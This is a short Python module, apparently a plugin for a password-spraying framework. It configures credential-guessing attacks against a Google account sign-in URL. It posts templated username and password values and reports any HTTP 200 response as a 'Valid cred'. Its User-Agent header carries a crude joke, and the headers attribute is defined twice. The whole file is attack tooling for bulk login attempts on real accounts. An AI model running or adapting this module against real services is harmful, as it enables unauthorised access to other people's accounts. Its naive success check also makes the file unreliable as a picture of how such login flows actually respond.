from .base import BaseSprayModule

class SprayModule(BaseSprayModule):

    # HTTP method
    method = 'POST'
    # default target URL
    default_url = 'https://accounts.google.com/v3/signin/identifier?dsh=S100793188%3A1690546893694417&elo=1&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=AeDOFXgDD24mtKXMI7Ivtd24pjnrEFB1j-eATt3i_bPyZKgfOqVQp0G26Wt5Be_UJl0FwBTQYSYlkg'
    # body of request
    request_data = { 
        "username": "{username}",
        "password": "{password}",
    }
    # HTTP headers
    headers = {}
    # HTTP cookies
    cookies = {}
    # Don't count nonexistent accounts as failed logons
    fail_nonexistent = False

    headers = {
        'User-Agent': 'Your Moms Smart Vibrator',
    }


    def check_response(self, response):
        '''
        returns (valid, exists, locked, msg)
        '''

        valid = False
        exists = None
        locked = None
        msg = ''

        if getattr(response, 'status_code', 0) == 200:
            valid = True
            exists = True
            msg = 'Valid cred'

        return (valid, exists, locked, msg)
